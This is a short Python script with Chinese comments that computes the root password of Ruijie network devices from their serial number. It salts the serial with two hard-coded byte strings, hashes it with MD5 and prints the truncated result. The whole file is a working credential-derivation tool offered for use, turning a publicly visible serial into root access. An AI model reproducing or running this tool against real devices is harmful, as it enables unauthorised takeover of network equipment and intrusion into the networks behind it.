#! /bin/env python 

description = '''
# ----------------------------------------------------------
# Title: ruijie_root_password_calc.py
# Author: air_jinkela(air_jinkela@163.com)
# Date: 2025-06-05
# Description: Calculate root password from SN.
# Depends hashlib
# ----------------------------------------------------------
'''
import hashlib

# 盐
SALT1 = b'\xA2\xAA\x1F\xF6\xE9\xF4\x45\x0F\xF0\xEE\x32\xBB\x47\x62\xA5\xD4'
SALT2 = b'\x32\x03\x08\x51\x73\x56\x77\x91\xE1\x6F\xA2\x5B\x4C\xC2\xD5\x7D'

def compute_salted_md5(input_str):
    #将输入字符串转换为字节
    input_bytes = input_str.encode('utf-8')
    
    #SALT1 + input + SALT2
    buffer = bytearray()
    buffer.extend(SALT1)
    buffer.extend(input_bytes)
    buffer.extend(SALT2)
    
    #计算 MD5 哈希
    md5_hash = hashlib.md5(buffer).digest()
    
    #转换为十六进制字符串
    hex_digest = md5_hash.hex()
    
    return hex_digest[:16]

if __name__ == "__main__":
    print(description)
    device_serial = input("请输入设备SN:")#"G1RPCXT11451A4"
    password = compute_salted_md5(device_serial)
    print(f"root 密码: {password}")
